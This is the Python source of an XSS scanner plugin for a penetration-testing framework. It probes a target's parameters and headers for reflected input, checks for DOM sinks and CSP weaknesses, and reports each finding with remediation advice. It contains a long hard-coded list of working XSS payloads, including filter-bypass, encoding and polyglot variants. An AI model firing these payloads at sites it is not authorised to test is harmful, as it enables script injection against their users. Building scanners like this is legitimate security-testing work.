"""Reflected XSS detection — context-aware, multi-injection-point, WAF bypass.

Uses PayloadEngine for payloads, WafBypassEngine for WAF evasion,
ResponseDiffer for reflection detection. Context detection: HTML/attribute/JS/URL.
Level: dalfox-lite (detection with context awareness).
"""

from __future__ import annotations

import logging
import re
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target
from basilisk.utils.injection_points import _SKIP_POST_PARAMS
from basilisk.utils.payloads import PayloadCategory

logger = logging.getLogger(__name__)

XSS_CANARY = "basilisk7x3s"

# Reflection context detection patterns
_CTX_HTML_TAG = re.compile(r"<[^>]*basilisk7x3s[^>]*>", re.IGNORECASE)
_CTX_HTML_ATTR = re.compile(
    r'(?:value|href|src|action|data)\s*=\s*["\'][^"\']*basilisk7x3s', re.IGNORECASE,
)
_CTX_JS_STRING = re.compile(
    r"(?:var\s+\w+|['\"])\s*[=:]\s*['\"][^'\"]*basilisk7x3s", re.IGNORECASE,
)
_CTX_URL = re.compile(r"(?:href|src|action)\s*=\s*[\"']?[^\"']*basilisk7x3s", re.IGNORECASE)

# DOM XSS dangerous sinks
DOM_SINKS = [
    "document.write(", "document.writeln(", ".innerHTML",
    "eval(", "setTimeout(", "setInterval(", "Function(",
    ".outerHTML", "document.location", "window.location",
    "document.URL", "document.documentURI", "document.referrer",
    "location.href", "location.search", "location.hash",
    ".insertAdjacentHTML(",
]

# Params commonly reflecting input
XSS_PARAMS = [
    "q", "search", "query", "s", "keyword", "name", "redirect",
    "url", "next", "return", "callback", "message", "error",
    "text", "title", "content", "value", "input", "data",
    "id", "comment", "feedback",
]

# Headers that sometimes reflect
XSS_HEADERS = [
    ("User-Agent", f"Mozilla/5.0 <{XSS_CANARY}>"),
    ("Referer", f"http://example.com/<{XSS_CANARY}>"),
]


class XssBasicPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="xss_basic",
        display_name="XSS Scanner",
        category=PluginCategory.PENTESTING,
        description=(
            "Detects reflected XSS with context-aware analysis, "
            "header injection, DOM sink hints, and WAF bypass"
        ),
        produces=["xss_findings"],
        timeout=90.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"xss_tests": []},
            )

        # Get payloads from PayloadEngine or use defaults
        payloads = self._get_payloads(ctx)

        # Collect injection points from crawled data + hardcoded fallbacks
        from basilisk.utils.injection_points import collect_injection_points

        inj_points = collect_injection_points(
            target.host, ctx,
            hardcoded_paths=["/", "/rest/track-order/test"],
            hardcoded_params=XSS_PARAMS,
            param_filter=XSS_PARAMS,
            max_points=25,
        )

        # ── Phase 1: Reflection probe (canary) ───────────────────────
        # (path, param, context, method, all_params)
        reflecting_points: list[tuple[str, str, str, str, dict]] = []
        for point in inj_points:
            if ctx.should_stop or len(reflecting_points) >= 8:
                break
            for param in point.params:
                if ctx.should_stop or len(reflecting_points) >= 8:
                    break
                if point.method == "POST":
                    post_data = point.build_post_data(param, XSS_CANARY)
                    body = await self._fetch_post(ctx, f"{base_url}{point.path}", post_data)
                else:
                    url = point.build_url(base_url, param, XSS_CANARY)
                    body = await self._fetch(ctx, url)
                if body is None or XSS_CANARY not in body:
                    continue

                context = self._detect_context(body)
                reflecting_points.append(
                    (point.path, param, context, point.method, dict(point.params)),
                )
                tested.append({
                    "path": point.path, "param": param, "context": context,
                    "method": point.method,
                })

        # ── Phase 2: Payload injection on reflecting params ──────────
        for path, param, context, method, all_params in reflecting_points:
            if ctx.should_stop or len(findings) >= 5:
                break

            # Pick context-appropriate payloads
            context_payloads = self._select_for_context(payloads, context)

            point_found = False
            for raw_payload in context_payloads:
                if ctx.should_stop or point_found:
                    break
                variants = self._get_variants(ctx, raw_payload)
                for variant in variants:
                    if method == "POST":
                        post_data = {
                            p: (variant if p == param else v)
                            for p, v in all_params.items()
                            if p == param or p.lower() not in _SKIP_POST_PARAMS
                        }
                        body = await self._fetch_post(
                            ctx, f"{base_url}{path}", post_data,
                        )
                        url = f"{base_url}{path} [POST {param}]"
                    else:
                        parts = []
                        for p, v in all_params.items():
                            if p == param:
                                parts.append(f"{p}={quote(variant)}")
                            else:
                                parts.append(f"{p}={quote(v or 'test')}")
                        url = f"{base_url}{path}?{'&'.join(parts)}"
                        body = await self._fetch(ctx, url)
                    if body is None:
                        continue

                    reflected_raw = variant in body
                    # Check if payload was HTML-encoded (entities = not vuln)
                    html_encoded = (
                        "&lt;" in body
                        and variant.replace("<", "&lt;") in body
                    )
                    if html_encoded:
                        continue

                    # Check for HTML-significant reflection (tags/events not encoded)
                    tag_reflected = bool(re.search(
                        r"<\s*(img|svg|script|iframe|details|body|input|"
                        r"video|marquee|object|a|div|embed)\b[^>]*"
                        r"(onerror|onload|onfocus|onmouseover|onclick|"
                        r"ontoggle|onbegin|onstart)\s*=",
                        body, re.IGNORECASE,
                    )) and XSS_CANARY in body

                    method_label = f" [{method}]" if method == "POST" else ""

                    if tag_reflected:
                        # Context-aware severity and confidence
                        in_script = bool(re.search(
                            r"<script[^>]*>[^<]*" + re.escape(XSS_CANARY),
                            body, re.IGNORECASE,
                        ))
                        if in_script:
                            sev, conf = Finding.critical, 0.9
                        elif context == "js_string":
                            sev, conf = Finding.high, 0.9
                        else:
                            sev, conf = Finding.high, 0.8
                        findings.append(sev(
                            f"Reflected XSS: HTML event handler via "
                            f"{path}?{param}={method_label}",
                            description=(
                                f"Event handler payload reflected in {context} context. "
                                f"Payload: {raw_payload[:80]}"
                            ),
                            evidence=f"URL: {url}\nPayload: {raw_payload[:80]}",
                            confidence=conf,
                            remediation="Encode all user input with context-aware encoding",
                            tags=["pentesting", "xss", context],
                        ))
                        point_found = True
                        break
                    elif reflected_raw and "<" in variant and "<" in body:
                        # Check if angle brackets survived
                        test_tag = f"<{XSS_CANARY}>"
                        if test_tag in body:
                            findings.append(Finding.high(
                                f"Reflected XSS: tag injection via "
                                f"{path}?{param}={method_label}",
                                description=(
                                    f"HTML tags reflected without encoding in "
                                    f"{context} context"
                                ),
                                evidence=(
                                    f"URL: {url}\n"
                                    f"Payload: {raw_payload[:80]}"
                                ),
                                confidence=0.7,
                                remediation="Encode all user input in HTML output",
                                tags=["pentesting", "xss", context],
                            ))
                            point_found = True
                            break
                    elif reflected_raw:
                        findings.append(Finding.medium(
                            f"Input reflected ({context}): "
                            f"{path}?{param}={method_label}",
                            description=(
                                f"User input reflected in {context} context "
                                f"(potential XSS)"
                            ),
                            evidence=(
                                f"URL: {url}\n"
                                f"Payload: {raw_payload[:60]}"
                            ),
                            confidence=0.5,
                            remediation="Apply context-aware output encoding",
                            tags=["pentesting", "xss", context],
                        ))
                        point_found = True
                        break

        # ── Phase 3: Header reflection check ─────────────────────────
        if not findings and not ctx.should_stop:
            for hdr_name, hdr_payload in XSS_HEADERS:
                body = await self._fetch_with_header(ctx, base_url, hdr_name, hdr_payload)
                if body and XSS_CANARY in body:
                    tag_in = f"<{XSS_CANARY}>" in body
                    severity = Finding.high if tag_in else Finding.medium
                    findings.append(severity(
                        f"XSS via {hdr_name} header reflection",
                        description=f"{hdr_name} value reflected in response body",
                        evidence=f"Header: {hdr_name}: {hdr_payload}",
                        remediation="Never reflect HTTP headers in response body",
                        tags=["pentesting", "xss", "header"],
                    ))
                    break

        # ── Phase 4: DOM XSS sink detection ──────────────────────────
        if not ctx.should_stop:
            body = await self._fetch(ctx, base_url)
            if body:
                sinks_found = [s for s in DOM_SINKS if s.lower() in body.lower()]
                if sinks_found:
                    findings.append(Finding.low(
                        f"DOM XSS sinks detected: {len(sinks_found)} dangerous patterns",
                        description="JavaScript contains DOM manipulation patterns",
                        evidence=", ".join(sinks_found[:8]),
                        remediation="Review DOM manipulation code for XSS vulnerabilities",
                        tags=["pentesting", "xss", "dom"],
                    ))

        # ── Phase 5: CSP check ───────────────────────────────────────
        if not ctx.should_stop:
            csp_issue = await self._check_csp(ctx, base_url)
            if csp_issue:
                findings.append(csp_issue)

        if not findings:
            findings.append(Finding.info(
                "No reflected XSS detected", tags=["pentesting", "xss"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"xss_tests": tested, "reflecting_points": len(reflecting_points)},
        )

    # ── Payload helpers ───────────────────────────────────────────────

    @staticmethod
    def _get_payloads(ctx) -> list[str]:
        # Core canary payloads required for HIGH/CRITICAL detection logic
        core = [
            f"<{XSS_CANARY}>",
            f"<img src=x onerror=alert({XSS_CANARY})>",
            f"<svg onload=alert({XSS_CANARY})>",
            f"<script>alert({XSS_CANARY})</script>",
        ]
        if hasattr(ctx, "payloads") and ctx.payloads:
            engine = ctx.payloads.get(PayloadCategory.XSS, max_waf=1, limit=25)
            extra = [p.value for p in engine if p.value not in core]
            return core + extra
        return [
            # Basic tag injection
            f"<{XSS_CANARY}>",
            f"<script>alert({XSS_CANARY})</script>",
            f"<script>{XSS_CANARY}</script>",
            f"<img src=x onerror=alert({XSS_CANARY})>",
            f"<svg onload=alert({XSS_CANARY})>",
            f"<svg/onload=alert({XSS_CANARY})>",
            # Event handlers
            f"<body onload=alert({XSS_CANARY})>",
            f"<input onfocus=alert({XSS_CANARY}) autofocus>",
            f"<details open ontoggle=alert({XSS_CANARY})>",
            f"<marquee onstart=alert({XSS_CANARY})>",
            f"<video src=x onerror=alert({XSS_CANARY})>",
            f"<iframe src=x onload=alert({XSS_CANARY})>",
            f"<object data=x onerror=alert({XSS_CANARY})>",
            f"<div onmouseover=alert({XSS_CANARY})>{XSS_CANARY}</div>",
            f"<img src=x onanimationend=alert({XSS_CANARY})>",
            # Attribute escape
            f"\" onfocus=alert({XSS_CANARY}) autofocus=\"",
            f"' onfocus=alert({XSS_CANARY}) '",
            f"\" onmouseover=\"alert({XSS_CANARY})",
            f"\"autofocus onfocus=alert({XSS_CANARY})//",
            # JS context escape
            f"'-alert({XSS_CANARY})-'",
            f"\";alert({XSS_CANARY})//",
            f"\\'-alert({XSS_CANARY})-\\'",
            f"</script><script>alert({XSS_CANARY})</script>",
            # Filter bypass — case variations and nesting
            f"<ScRiPt>alert({XSS_CANARY})</ScRiPt>",
            f"<scr<script>ipt>alert({XSS_CANARY})</scr</script>ipt>",
            f"<img/src=x onerror=alert({XSS_CANARY})>",
            f"<IMG SRC=x ONERROR=alert({XSS_CANARY})>",
            # Encoding bypass — HTML entities and hex
            f"<img src=x onerror=&#97;&#108;&#101;&#114;&#116;({XSS_CANARY})>",
            f"<img src=x onerror=\\x61lert({XSS_CANARY})>",
            # DOM-based / protocol handlers
            f"javascript:alert({XSS_CANARY})",
            f"data:text/html,<script>alert({XSS_CANARY})</script>",
            # Template literal
            f"${{alert({XSS_CANARY})}}",
            # Polyglot
            f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert({XSS_CANARY}) )//"
            f"%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/"
            f"oNloAd=alert({XSS_CANARY})//>\\x3e",
            # Embed / object
            f"<embed src=javascript:alert({XSS_CANARY})>",
            f"<a href=javascript:alert({XSS_CANARY})>{XSS_CANARY}</a>",
        ]

    @staticmethod
    def _select_for_context(payloads: list[str], context: str) -> list[str]:
        """Prioritize payloads for detected context."""
        if context == "html_attr":
            # Prioritize attribute-breaking payloads
            attr_first = [p for p in payloads if '"' in p[:3] or "'" in p[:3]]
            rest = [p for p in payloads if p not in attr_first]
            return (attr_first + rest)[:15]
        elif context == "js_string":
            js_first = [p for p in payloads if "'-" in p or '"-' in p or "script>" in p]
            rest = [p for p in payloads if p not in js_first]
            return (js_first + rest)[:15]
        return payloads[:15]

    @staticmethod
    def _get_variants(ctx, payload: str) -> list[str]:
        variants = [payload]
        if hasattr(ctx, "waf_bypass") and ctx.waf_bypass and ctx.waf_bypass.waf_detected:
            encoded = ctx.waf_bypass.encode(payload)
            for v in encoded:
                if v not in variants:
                    variants.append(v)
        return variants[:3]

    @staticmethod
    def _detect_context(body: str) -> str:
        """Detect reflection context from response body."""
        if _CTX_JS_STRING.search(body):
            return "js_string"
        if _CTX_HTML_ATTR.search(body):
            return "html_attr"
        if _CTX_HTML_TAG.search(body):
            return "html_tag"
        if _CTX_URL.search(body):
            return "url"
        return "html_body"

    # ── Network helpers ───────────────────────────────────────────────

    async def _fetch(self, ctx, url: str) -> str | None:
        try:
            async with ctx.rate:
                resp = await ctx.http.get(url, timeout=8.0)
                # Skip error pages — they reflect URLs but aren't exploitable
                if resp.status in (403, 404) or resp.status >= 500:
                    return None
                return await resp.text(encoding="utf-8", errors="replace")
        except Exception as e:
            logger.debug("XSS fetch %s failed: %s", url, e)
            return None

    async def _fetch_post(self, ctx, url: str, data: dict) -> str | None:
        try:
            async with ctx.rate:
                resp = await ctx.http.post(url, data=data, timeout=8.0)
                if resp.status in (403, 404) or resp.status >= 500:
                    return None
                return await resp.text(encoding="utf-8", errors="replace")
        except Exception as e:
            logger.debug("XSS POST fetch %s failed: %s", url, e)
            return None

    async def _fetch_with_header(
        self, ctx, base_url: str, hdr: str, val: str,
    ) -> str | None:
        try:
            async with ctx.rate:
                resp = await ctx.http.get(
                    base_url, headers={hdr: val}, timeout=8.0,
                )
                return await resp.text(encoding="utf-8", errors="replace")
        except Exception as e:
            logger.debug("XSS header fetch %s failed: %s", base_url, e)
            return None

    async def _check_csp(self, ctx, base_url: str) -> Finding | None:
        """Check if CSP is missing or allows inline scripts."""
        try:
            async with ctx.rate:
                resp = await ctx.http.get(base_url, timeout=5.0)
                csp = resp.headers.get("Content-Security-Policy", "")
                if not csp:
                    return Finding.low(
                        "No Content-Security-Policy header",
                        description="Missing CSP allows unrestricted script execution",
                        remediation="Add CSP header with script-src directive",
                        tags=["pentesting", "xss", "csp"],
                    )
                if "'unsafe-inline'" in csp and "script-src" in csp:
                    return Finding.low(
                        "CSP allows unsafe-inline scripts",
                        description="CSP script-src includes 'unsafe-inline'",
                        evidence=f"CSP: {csp[:200]}",
                        remediation="Remove unsafe-inline and use nonces or hashes",
                        tags=["pentesting", "xss", "csp"],
                    )
        except Exception as e:
            logger.debug("CSP check %s failed: %s", base_url, e)
            pass
        return None
